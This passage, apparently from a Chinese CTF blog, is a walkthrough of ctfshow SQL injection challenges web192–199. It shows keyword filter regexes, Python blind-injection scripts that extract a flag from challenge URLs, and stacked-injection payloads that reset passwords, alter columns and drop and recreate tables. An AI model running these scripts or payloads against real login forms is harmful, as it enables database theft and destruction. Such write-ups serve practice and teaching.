punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>ban了ascii，可以使用ord</p><h4 id="web192-regexp"><a href="#web192-regexp" class="headerlink" title="web192(regexp)"></a>web192(regexp)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii|ord|hex/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>ord</code> <code>hex</code>都被ban了</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">'https://672395a7-518e-4be5-b990-8af1ef5202c4.challenge.ctf.show/api/'</span>flagstr <span class="token operator">=</span> <span class="token string">" _&#123;&#125;-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsflag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        <span class="token comment"># 查数据库  ctfshow_fl0g,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查字段  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_fl0g"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">'),1,2)='1"</span></span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token number">1</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"密码错误"</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web193-left-right"><a href="#web193-left-right" class="headerlink" title="web193(left right)"></a>web193(left right)</h4><p>过滤了<code>file|into|ascii|ord|hex|substr</code>，substr没了，可以用<code>left() right()</code>，其实也可以用<code>mid()</code>，这里将数据库名字给改了，和192的不一样，需要重新构造一个用来查询的语句。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://df755a50-9318-495a-9788-1c5c721b44e2.challenge.ctf.show:8080/api/"</span>flagstr<span class="token operator">=</span><span class="token string">"abcdefghijklmnopqrstuvwxyz1234567890_&#123;-&#125; ,"</span>flag<span class="token operator">=</span><span class="token string">"ctf"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        change<span class="token operator">=</span>flag<span class="token operator">+</span>j        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(left((select group_concat(f1ag)from ctfshow_flxg),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>change<span class="token punctuation">&#125;</span></span><span class="token string">'),1,0)=1#"</span></span>        <span class="token comment">#payload = f"admin' and if((select group_concat(f1ag)from ctfshow_flxg)regexp('&#123;change&#125;'),1,0)=1#"</span>        <span class="token comment">#第二个payload没有使用截断字符串的函数，直接使用regexp进行的匹配</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre><p>可以将payload的left给去掉，直接正则匹配，不过需要起一个’ctfshow{‘的头就行就行。Y4大佬的做法是，将<code>&#123;</code>放到了<code>flagstr</code>的前边</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"https://d8ecee4e-9c33-46b3-af79-befbc602b859.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">" _&#123;&#125;-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsflag <span class="token operator">=</span> <span class="token string">'ctf'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        tmp <span class="token operator">=</span> flag <span class="token operator">+</span> j        <span class="token comment"># 查数据库  ctfshow_flxg,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查字段  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_flxg"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">'),1,2)='1"</span></span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"&#125;"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>二分法依然可行，只是并不是单独的字符比较，是字符串的比较，但原理是一样的。<br>即：ab&#x3D;ab，ab&lt;ac，是对字符串不一致的第一字符进行比较。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://fa58a58a-11d4-4c3e-9009-e7a0c53565b8.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">127</span>    <span class="token builtin">min</span> <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> mid<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        payload <span class="token operator">=</span> <span class="token string">"admin'and ((left((select f1ag from ctfshow_flxg),&#123;&#125;)&lt;'&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>flag<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token builtin">max</span> <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token builtin">min</span> <span class="token operator">=</span> mid </code></pre><h4 id="web194-lpad"><a href="#web194-lpad" class="headerlink" title="web194(lpad)"></a>web194(lpad)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii|ord|hex|substr|char|left|right|substring/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>left</code> <code>right</code>被ban了，可以直接正则匹配，不过直接正则的方法有局限</p><p>找一找其他和截取有关的函数，发现<code>lpad()</code>。</p><p><code>lpad(str,len,padstr)</code><br><code>lpad()</code>函数返回字符串<code>str</code>，<code>len</code>小于字符串长度相当于字符串截取；大于字符串长度，则在左填充用字符串<code>padstr</code>直到达到<code>len</code>字符长度。</p><p>有左填充，一般就是右填充，找到<code>rpad()</code>，用法和<code>lpad()</code>类似。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://8be98a09-12b0-4f66-807f-899826d58216.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">",_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789"</span>tempstr <span class="token operator">=</span> <span class="token string">""</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> mid <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        <span class="token comment">#payload = "admin'and ((lpad((select database()),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#ctfshow_web</span>        <span class="token comment">#payload = "admin'and ((lpad((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#ctfshow_flxg</span>        <span class="token comment">#payload = "admin'and ((lpad((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'),&#123;&#125;,'')='&#123;&#125;'))#".format(i,tempstr+mid)</span>        <span class="token comment">#id,f1ag</span>        payload <span class="token operator">=</span> <span class="token string">"admin'and ((lpad((select f1ag from ctfshow_flxg),&#123;&#125;,'')='&#123;&#125;'))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>tempstr<span class="token operator">+</span>mid<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8bef"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            tempstr <span class="token operator">+=</span> mid            flag <span class="token operator">+=</span> mid            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++++"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web195-堆叠注入"><a href="#web195-堆叠注入" class="headerlink" title="web195(堆叠注入)"></a>web195(堆叠注入)</h4><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//密码检测</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'密码只能为数字'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//密码判断</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token comment">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"登陆成功 flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>过滤了select，单双引号也被过滤，没有报错提示。</p><p>没有过滤分号，考虑堆叠注入。但不能有空格，可以通过反引号包裹表名等信息的方式绕过空格过滤。</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">update</span><span class="token identifier"><span class="token punctuation">`</span>ctfshow_user<span class="token punctuation">`</span></span><span class="token keyword">set</span><span class="token identifier"><span class="token punctuation">`</span>pass<span class="token punctuation">`</span></span><span class="token operator">=</span><span class="token number">1</span></code></pre><p>这里用update将pass改为1，可以登陆成功</p><p>因为查询语句的where判断是<code>username=&#123;$username&#125;</code>，并没有引号包裹，那么就可以输入数字了。</p><p>sql里，数字和字符串的匹配是弱类型比较，字符串会转换为数字，如<code>0==admin</code>，那么如果输入的username是0，则会匹配所有开头不</p><p>是数字或者为0的字符串和数字0</p><p>但是可以使用另一种方法</p><pre class="language-sql" data-language="sql"><code class="language-sql">payload<span class="token operator">=</span><span class="token string">"0x61646d696e;update`ctfshow_user`set`pass`=0x313131;"</span><span class="token comment"># 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围</span><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = &#123;$username&#125;;"</span><span class="token punctuation">;</span></code></pre><h4 id="web196-select-row-0"><a href="#web196-select-row-0" class="headerlink" title="web196(select row[0])"></a>web196(select row[0])</h4><p>这道题目的select虽然写的是被过滤了，但是实际并没有被过滤。（根据群里的反馈，说群主本来是打算把过滤select写成se1ect，但是</p><p>忘记改了。不过se1ect也并没有被过滤，感觉纯粹就是没有加select的过滤～）</p><p>可以用select绕过password的if判断。</p><p>判断条件满足的设定是<code>$row[0]==$password</code>，$row存储的是结果集中的一行数据，$row[0]就是这一行的第一个数据。既然可以堆叠注</p><p>入，就是可以多语句查询，$row应该也会逐一循环获取每个结果集。</p><p>那么可以输入username为<code>1;select(9)</code>，password为9。当$row获取到第二个查询语句select(9)的结果集时，即可获得$row[0]&#x3D;9，那</p><p>么password输入9就可以满足条件判断。同样输入其他密码也可以</p><h4 id="web197-alert修改字段-show-tables-drop"><a href="#web197-alert修改字段-show-tables-drop" class="headerlink" title="web197(alert修改字段  show tables  drop)"></a>web197(alert修改字段  show tables  drop)</h4><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"登陆成功 flag is <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>这次select被ban了</p><p><strong>方法一</strong></p><p>利用<code>show</code>。根据题目给的查询语句，可以知道数据库的表名为ctfshow_user，那么可以通过<code>show tables</code>，获取表名的结果集，在这个</p><p>结果集里定然有一行的数据为ctfshow_user。</p><p>用户名：<code>1;show tables</code></p><p>密码：<code>ctfshow_user</code></p><p><strong>方法二</strong></p><p>可以利用<code>alter</code>修改字段名，把<code>id</code>和<code>pass</code>对调，然后爆破id。</p><p><strong>ALTER TABLE</strong> 语句用于在已有的表中添加、修改或删除列。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;alter table ctfshow_user change column &#96;pass&#96; &#96;a&#96; varchar(255);alter table ctfshow_user change column &#96;id&#96; &#96;pass&#96; varchar(255);alter table ctfshow_user change column &#96;a&#96; &#96;id&#96; varchar(255)</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://1a4c8604-7c24-4000-a07a-b9c23f8c0ca3.challenge.ctf.show/api/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '</span>                        <span class="token string">'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '</span>                        <span class="token string">'varchar(255);'</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0x61646d696e'</span><span class="token punctuation">,</span>  <span class="token comment"># 0</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>    <span class="token punctuation">&#125;</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"登陆成功"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+]id </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string"> is right"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p><strong>方法三</strong></p><p>更新表。过滤了update，但我们可以删表，重新建一个同样表名的表，列名给的查询语句也已经告知，分别是username和pass。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">0;drop table ctfshow_user;create table ctfshow_user(&#96;username&#96; varchar(100),&#96;pass&#96; varchar(100));insert ctfshow_user(&#96;username&#96;,&#96;pass&#96;) value(1,1)</code></pre><p>这里的意思就是删除以前的表，再自己新建一个并且插入数据：username&#x3D;1，pass&#x3D;1</p><p>然后直接输入1为用户名和密码，登录即可得到flag。</p><h4 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h4><p>过滤了<code>create</code> <code>drop</code>，但可以用其他方法</p><h4 id="wen199"><a href="#wen199" class="headerlink" title="wen199"></a>wen199</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token 